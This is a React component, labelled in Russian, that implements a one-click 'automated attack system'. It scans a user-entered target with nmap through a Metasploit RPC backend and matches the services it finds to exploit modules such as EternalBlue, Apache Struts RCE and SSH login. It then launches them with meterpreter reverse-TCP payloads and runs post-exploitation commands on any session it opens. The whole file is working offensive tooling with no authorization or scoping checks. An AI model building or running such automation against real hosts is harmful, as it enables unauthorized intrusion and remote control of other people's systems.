import { useState, useCallback } from 'react'
import { useToast } from "@/hooks/use-toast"
import { supabase } from '@/integrations/supabase/client'
import { Card, CardContent } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Progress } from "@/components/ui/progress"
import { Badge } from "@/components/ui/badge"
import { Input } from "@/components/ui/input"
import { Play, Square, Target, Zap, Terminal } from "lucide-react"

interface AutomatedCommandSystemProps {
  isActive: boolean
  onCommandStart: () => void
  onCommandComplete: (results: any) => void
}

export const AutomatedCommandSystem = ({ 
  isActive, 
  onCommandStart, 
  onCommandComplete 
}: AutomatedCommandSystemProps) => {
  const [isRunning, setIsRunning] = useState(false)
  const [currentStep, setCurrentStep] = useState('')
  const [target, setTarget] = useState('')
  const [progress, setProgress] = useState(0)
  const [logs, setLogs] = useState<string[]>([])
  const { toast } = useToast()

  const addLog = (message: string) => {
    setLogs(prev => [...prev.slice(-9), `[${new Date().toLocaleTimeString()}] ${message}`])
  }

  const executeAutomatedFlow = useCallback(async (targetHost: string) => {
    if (!targetHost || isRunning) return

    setIsRunning(true)
    setProgress(0)
    setLogs([])
    onCommandStart()

    try {
      // Step 1: Initial reconnaissance
      setCurrentStep('Выполняется разведка...')
      setProgress(20)
      addLog(`Начинаем разведку цели: ${targetHost}`)
      toast({
        title: "Автоматизированная атака",
        description: `Начинаем разведку цели: ${targetHost}`,
      })

      const scanResult = await executeCommand(`nmap -sV -sC ${targetHost}`)
      addLog('Сканирование портов завершено')
      
      // Step 2: Analyze scan results
      setCurrentStep('Анализ результатов сканирования...')
      setProgress(40)
      const vulnerabilities = await analyzeVulnerabilities(scanResult)
      addLog(`Найдено уязвимостей: ${vulnerabilities.length}`)

      // Step 3: Select and configure exploits
      setCurrentStep('Выбор эксплойтов...')
      setProgress(60)
      const selectedExploits = await selectExploits(vulnerabilities)
      addLog(`Выбрано эксплойтов: ${selectedExploits.length}`)

      // Step 4: Execute exploits automatically
      setProgress(80)
      const exploitResults = []
      for (const exploit of selectedExploits) {
        setCurrentStep(`Выполняется эксплойт: ${exploit.name}`)
        addLog(`Запуск: ${exploit.name}`)

        const result = await executeExploit(exploit, targetHost)
        exploitResults.push(result)

        if (result.success) {
          addLog(`✓ Получена сессия: ${result.sessionId}`)
          toast({
            title: "Эксплойт успешен!",
            description: `Получена сессия: ${result.sessionId}`,
          })
          
          // Step 5: Post-exploitation if successful
          setCurrentStep('Пост-эксплуатация...')
          await postExploitation(result.sessionId)
        } else {
          addLog(`✗ Эксплойт неуспешен: ${exploit.name}`)
        }
      }

      setCurrentStep('Завершено')
      setProgress(100)
      addLog('Автоматизированная атака завершена')
      
      onCommandComplete({
        target: targetHost,
        scanResult,
        vulnerabilities,
        exploitResults,
        timestamp: new Date()
      })

      toast({
        title: "Автоматизированная атака завершена",
        description: `Обработано ${exploitResults.length} эксплойтов`,
      })

    } catch (error: any) {
      addLog(`Ошибка: ${error.message}`)
      toast({
        title: "Ошибка автоматизации",
        description: error.message,
        variant: "destructive",
      })
    } finally {
      setIsRunning(false)
      setCurrentStep('')
      setProgress(0)
    }
  }, [isRunning, onCommandStart, onCommandComplete, toast])

  const executeCommand = async (command: string) => {
    const { data, error } = await supabase.functions.invoke('metasploit-rpc', {
      body: { action: 'execute', command }
    })
    
    if (error) throw error
    return data.output
  }

  const analyzeVulnerabilities = async (scanOutput: string) => {
    const vulnerabilities = []
    
    if (scanOutput.includes('ssh')) {
      vulnerabilities.push({
        service: 'ssh',
        port: '22',
        version: extractVersion(scanOutput, 'ssh'),
        exploits: ['auxiliary/scanner/ssh/ssh_login', 'exploit/linux/ssh/sshexec']
      })
    }
    
    if (scanOutput.includes('http')) {
      vulnerabilities.push({
        service: 'http',
        port: '80',
        version: extractVersion(scanOutput, 'http'),
        exploits: ['auxiliary/scanner/http/dir_scanner', 'exploit/multi/http/apache_struts_rce']
      })
    }
    
    if (scanOutput.includes('smb')) {
      vulnerabilities.push({
        service: 'smb',
        port: '445',
        version: extractVersion(scanOutput, 'smb'),
        exploits: ['exploit/windows/smb/ms17_010_eternalblue', 'auxiliary/scanner/smb/smb_login']
      })
    }

    return vulnerabilities
  }

  const extractVersion = (output: string, service: string): string => {
    const regex = new RegExp(`${service}.*?([0-9]+\\.[0-9]+(?:\\.[0-9]+)?)`, 'i')
    const match = output.match(regex)
    return match ? match[1] : 'unknown'
  }

  const selectExploits = async (vulnerabilities: any[]) => {
    const exploits = []
    
    for (const vuln of vulnerabilities) {
      for (const exploitPath of vuln.exploits) {
        exploits.push({
          name: exploitPath,
          service: vuln.service,
          port: vuln.port,
          payload: selectPayload(vuln.service),
          options: generateExploitOptions(vuln)
        })
      }
    }
    
    return exploits.slice(0, 5)
  }

  const selectPayload = (service: string): string => {
    const payloads = {
      'ssh': 'linux/x64/meterpreter/reverse_tcp',
      'http': 'linux/x64/meterpreter/reverse_tcp',
      'smb': 'windows/x64/meterpreter/reverse_tcp',
      'default': 'generic/shell_reverse_tcp'
    }
    
    return payloads[service] || payloads.default
  }

  const generateExploitOptions = (vulnerability: any) => {
    return {
      RHOSTS: '',
      RPORT: vulnerability.port,
      LHOST: 'localhost',
      LPORT: '4444'
    }
  }

  const executeExploit = async (exploit: any, target: string) => {
    const commands = [
      `use ${exploit.name}`,
      `set RHOSTS ${target}`,
      `set RPORT ${exploit.options.RPORT}`,
      `set PAYLOAD ${exploit.payload}`,
      `set LHOST ${exploit.options.LHOST}`,
      `set LPORT ${exploit.options.LPORT}`,
      'exploit'
    ]

    let sessionId = null
    let success = false

    for (const cmd of commands) {
      const result = await executeCommand(cmd)
      
      if (result.includes('session') && result.includes('opened')) {
        const sessionMatch = result.match(/session (\d+) opened/i)
        if (sessionMatch) {
          sessionId = sessionMatch[1]
          success = true
        }
      }
    }

    return {
      exploit: exploit.name,
      target,
      success,
      sessionId,
      output: 'Exploit execution completed'
    }
  }

  const postExploitation = async (sessionId: string) => {
    const postCommands = [
      `sessions -i ${sessionId}`,
      'sysinfo',
      'getuid',
      'pwd',
      'ls'
    ]

    for (const cmd of postCommands) {
      try {
        await executeCommand(cmd)
      } catch (error) {
        console.log(`Post-exploitation command failed: ${cmd}`)
      }
    }
  }

  const handleStop = () => {
    setIsRunning(false)
    setCurrentStep('')
    setProgress(0)
    addLog('Атака остановлена пользователем')
  }

  return (
    <div className="space-y-4">
      <Card className="bg-gray-800/40 border-gray-700/50 backdrop-blur-sm">
        <CardContent className="p-4">
          <div className="flex items-center justify-between mb-4">
            <h3 className="text-lg font-semibold text-white flex items-center gap-2">
              <Zap className="h-5 w-5 text-yellow-500" />
              Автоматизированная система атак
            </h3>
            <Badge variant={isRunning ? "destructive" : "secondary"}>
              {isRunning ? "Выполняется" : "Готов"}
            </Badge>
          </div>

          <div className="space-y-4">
            <div className="flex gap-2">
              <Input
                placeholder="Цель (IP или домен)"
                value={target}
                onChange={(e) => setTarget(e.target.value)}
                className="bg-gray-700/40 border-gray-600/50 text-white"
                disabled={isRunning}
              />
              <Button
                onClick={() => executeAutomatedFlow(target)}
                disabled={!target || isRunning}
                className="bg-red-600/80 hover:bg-red-700/80"
              >
                <Play className="h-4 w-4 mr-1" />
                Атака
              </Button>
              {isRunning && (
                <Button
                  onClick={handleStop}
                  variant="outline"
                  className="border-gray-600/50 bg-gray-800/40 hover:bg-gray-600/40"
                >
                  <Square className="h-4 w-4 mr-1" />
                  Стоп
                </Button>
              )}
            </div>

            {isRunning && (
              <>
                <div className="space-y-2">
                  <div className="flex justify-between text-sm text-gray-400">
                    <span>{currentStep}</span>
                    <span>{progress}%</span>
                  </div>
                  <Progress value={progress} className="h-2" />
                </div>

                <div className="bg-black/40 rounded p-3 max-h-40 overflow-y-auto">
                  <div className="flex items-center gap-2 mb-2">
                    <Terminal className="h-4 w-4 text-green-500" />
                    <span className="text-sm text-green-500 font-mono">Лог выполнения</span>
                  </div>
                  <div className="space-y-1">
                    {logs.map((log, index) => (
                      <div key={index} className="text-xs text-gray-300 font-mono">
                        {log}
                      </div>
                    ))}
                  </div>
                </div>
              </>
            )}
          </div>
        </CardContent>
      </Card>
    </div>
  )
}
